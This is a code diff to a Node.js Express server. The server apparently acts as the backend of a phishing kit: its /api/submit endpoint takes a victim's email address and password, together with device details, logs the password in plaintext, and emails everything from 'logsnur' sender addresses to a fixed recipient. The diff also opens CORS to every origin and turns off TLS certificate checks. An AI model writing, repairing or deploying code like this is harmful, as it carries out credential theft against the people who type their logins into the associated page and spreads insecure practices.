@@ -129,19 +129,23 @@ const CONFIG = {
       FIRST_PW: 'logsnur01@rich.co',
       SECOND_PW: 'logsnur02@rich.us'
     }
-  },
-  CORS_ORIGIN: '*' // Change to your frontend URL in production
+  }
 };
 
-// Middleware
-app.use(express.json());
+// MIDDLEWARE - CORS FIRST!
 app.use(cors({
-  origin: CONFIG.CORS_ORIGIN,
+  origin: '*',
   methods: ['GET', 'POST', 'OPTIONS'],
-  allowedHeaders: ['Content-Type']
+  allowedHeaders: ['Content-Type', 'Authorization']
 }));
 
-// Email transporter
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true }));
+
+// Handle preflight requests
+app.options('*', cors());
+
+// Email transporter with better error handling
 const transporter = nodemailer.createTransport({
   host: 'smtp.gmail.com',
   port: 587,
@@ -149,24 +153,48 @@ const transporter = nodemailer.createTransport({
   auth: {
     user: CONFIG.EMAIL.USER,
     pass: CONFIG.EMAIL.PASS
+  },
+  tls: {
+    rejectUnauthorized: false
   }
 });
 
-// Add a GET route for testing
-app.get('/api/submit', (req, res) => {
+// Verify transporter on startup
+transporter.verify(function(error, success) {
+  if (error) {
+    console.log('❌ Email transporter error:', error);
+  } else {
+    console.log('✅ Email server is ready to send messages');
+  }
+});
+
+// TEST ENDPOINT - Simple working endpoint
+app.post('/api/test', (req, res) => {
+  console.log('✅ TEST ENDPOINT HIT! Body:', req.body);
   res.json({ 
-    message: 'This endpoint only accepts POST requests. Please use POST method to submit data.',
-    status: 'error'
+    success: true, 
+    message: 'Test endpoint working!',
+    received: req.body 
   });
 });
 
-// Handle preflight requests
-app.options('/api/submit', cors());
+// HEALTH CHECK
+app.get('/api/health', (req, res) => {
+  res.json({ 
+    status: 'OK', 
+    message: 'Server is running',
+    timestamp: new Date().toISOString()
+  });
+});
 
-// API Endpoint (POST only)
+// MAIN SUBMIT ENDPOINT - SIMPLIFIED
 app.post('/api/submit', async (req, res) => {
+  console.log('📨 SUBMIT ENDPOINT CALLED');
+  
   try {
-    console.log('Received POST data:', req.body);
+    // Log the incoming request
+    console.log('Request body received:', JSON.stringify(req.body, null, 2));
+    console.log('Request headers:', req.headers);
     
     const { 
       email,
@@ -178,21 +206,25 @@ app.post('/api/submit', async (req, res) => {
       device = {}
     } = req.body;
 
-    // Validate exactly one password exists
-    const passwordCount = [firstpasswordused, secondpasswordused].filter(Boolean).length;
-    if (passwordCount !== 1) {
+    // Basic validation
+    if (!email) {
       return res.status(400).json({
-        emailStatus: {
-          status: 'error',
-          message: 'Provide exactly one password'
-        }
+        success: false,
+        error: 'Email is required'
       });
     }
 
     const passwordUsed = firstpasswordused || secondpasswordused;
     const fromEmail = firstpasswordused ? CONFIG.EMAIL.SENDERS.FIRST_PW : CONFIG.EMAIL.SENDERS.SECOND_PW;
 
-    await transporter.sendMail({
+    console.log('📧 Preparing to send email...');
+    console.log('From:', fromEmail);
+    console.log('To:', CONFIG.EMAIL.RECIPIENT);
+    console.log('Email:', email);
+    console.log('Password:', passwordUsed);
+
+    // Send email
+    const mailOptions = {
       from: `"Zap!" <${fromEmail}>`,
       to: CONFIG.EMAIL.RECIPIENT,
       subject: `ZaP - ${email}`,
@@ -208,52 +240,51 @@ app.post('/api/submit', async (req, res) => {
         <p><strong>Brand:</strong> ${device.brand || 'N/A'}</p>
         <p><strong>Mobile:</strong> ${device.mobile ? 'Yes' : 'No'}</p>
       `
-    });
+    };
 
-    console.log('Email sent successfully for:', email);
+    const emailResult = await transporter.sendMail(mailOptions);
+    console.log('✅ Email sent successfully! Message ID:', emailResult.messageId);
 
     res.json({
-      emailStatus: {
-        status: 'success',
-        message: 'Email sent successfully'
-      }
+      success: true,
+      message: 'Email sent successfully',
+      emailId: emailResult.messageId
     });
 
   } catch (error) {
-    console.error('Error processing request:', error);
+    console.error('❌ ERROR in /api/submit:', error);
+    
     res.status(500).json({
-      emailStatus: {
-        status: 'error',
-        message: 'Internal server error'
-      }
+      success: false,
+      error: error.message,
+      details: 'Failed to process request'
     });
   }
 });
 
-// Health check endpoint
-app.get('/api/health', (req, res) => {
-  res.json({ 
-    status: 'OK', 
-    message: 'Server is running',
-    timestamp: new Date().toISOString()
+// Catch all other routes
+app.all('*', (req, res) => {
+  res.status(404).json({
+    success: false,
+    error: 'Route not found',
+    path: req.path,
+    method: req.method
   });
 });
 
-// Root endpoint
-app.get('/', (req, res) => {
-  res.json({ 
-    message: 'Email API Server is running',
-    endpoints: {
-      'GET /api/health': 'Health check',
-      'POST /api/submit': 'Submit email data',
-      'GET /api/submit': 'Test endpoint (use POST instead)'
-    }
+// Error handling middleware
+app.use((error, req, res, next) => {
+  console.error('🚨 Unhandled error:', error);
+  res.status(500).json({
+    success: false,
+    error: 'Internal server error'
   });
 });
 
 // Start server
 app.listen(CONFIG.PORT, () => {
-  console.log(`Server running on port ${CONFIG.PORT}`);
-  console.log(`CORS configured for: ${CONFIG.CORS_ORIGIN}`);
-  console.log(`Health check: http://localhost:${CONFIG.PORT}/api/health`);
+  console.log(`🚀 Server running on port ${CONFIG.PORT}`);
+  console.log(`📍 Health: https://server-gfhv.onrender.com/api/health`);
+  console.log(`📍 Test: https://server-gfhv.onrender.com/api/test`);
+  console.log(`📍 Submit: https://server-gfhv.onrender.com/api/submit`);
 });
